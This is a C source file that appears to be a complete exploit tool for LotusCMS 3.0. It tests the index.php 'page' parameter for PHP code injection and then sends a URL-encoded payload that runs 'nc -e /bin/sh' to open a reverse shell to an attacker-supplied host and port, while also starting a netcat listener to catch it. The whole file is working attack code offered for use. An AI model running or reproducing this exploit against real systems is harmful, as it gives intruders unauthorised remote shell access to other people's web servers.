#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define MAX 2048
#define FILENAME "curl_output.txt"

// Colours
#define RED_COLOUR    "\e[0;31m"
#define YELLOW_COLOUR "\e[0;33m"
#define GRAY_COLOUR   "\e[0;37m"
#define END_COLOUR    "\e[0m"

void exploit(char *url, char *lhost, char *lport) {

  pid_t pid;

  if((pid = fork()) == -1) {
    fprintf(stderr, RED_COLOUR"[-] Unable to fork the process\n"END_COLOUR);
    exit(5);
  }

  if(pid == 0) {

    char payload[MAX] = "";

    strcat(payload, url);
    strcat(payload, "/index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20");
    strcat(payload, lhost);
    strcat(payload, "%20");
    strcat(payload, lport);
    strcat(payload, "%27%29%7D%3B%23%22");

    close(STDOUT_FILENO);

    char *args[] = {"curl", "-s", "-X", "GET", payload, NULL};
    execvp("curl", args);

  }else {

    char *args[] = {"nc", "-nlvp", lport, NULL};
    execvp("nc", args);

  }

}

void check_vuln(char *url) {

  pid_t pid;

  if((pid = fork()) == -1) {
    fprintf(stderr, RED_COLOUR"[-] Unable to fork the process\n"END_COLOUR);
    exit(3);
  }

  if(pid == 0) {

    int fd = open("curl_output.txt", O_WRONLY | O_CREAT, 0644);
    char test[MAX] = "";
    fd = dup2(fd, STDOUT_FILENO);

    strcat(test, url);
    strcat(test, "/index.php?page=index%27%29%3B%24%7Bprint%28%27Vulnerable%27%29%7D%3B%23");

    char *args[] = {"curl", "-s", "-X", "GET", test, NULL};
    execvp("curl", args);

  }else {

    wait(NULL);

    int fd = open(FILENAME, O_RDONLY);
    char f_content[MAX];
  
    read(fd, f_content, MAX);
    system("rm curl_output.txt");

    if(strstr(f_content, "Vulnerable") == NULL) {
      fprintf(stderr, RED_COLOUR"[-] Target is not vulnerable\n"END_COLOUR);
      exit(4);
    }

    close(fd);

  }

}

void check_url(char *url) {

  if(strstr(url, "http://") == NULL && strstr(url, "https://") == NULL) {
    fprintf(stderr, RED_COLOUR"[-] Error. Expected http:// or https://\n"END_COLOUR);
    exit(2);
  }

}

int main(int argc, char **argv) {

  if(argc != 4) {
    fprintf(stderr, RED_COLOUR"[-] Error. Incorrect number of arguments specified\n"END_COLOUR);
    fprintf(stderr, YELLOW_COLOUR"[?]"END_COLOUR GRAY_COLOUR" Usage: ./lotuscms-3.0 <url> <lhost> <lport>\n"END_COLOUR);
    return 1;
  }

  check_url(argv[1]);
  check_vuln(argv[1]);
  exploit(argv[1], argv[2], argv[3]);

  return 0;

}
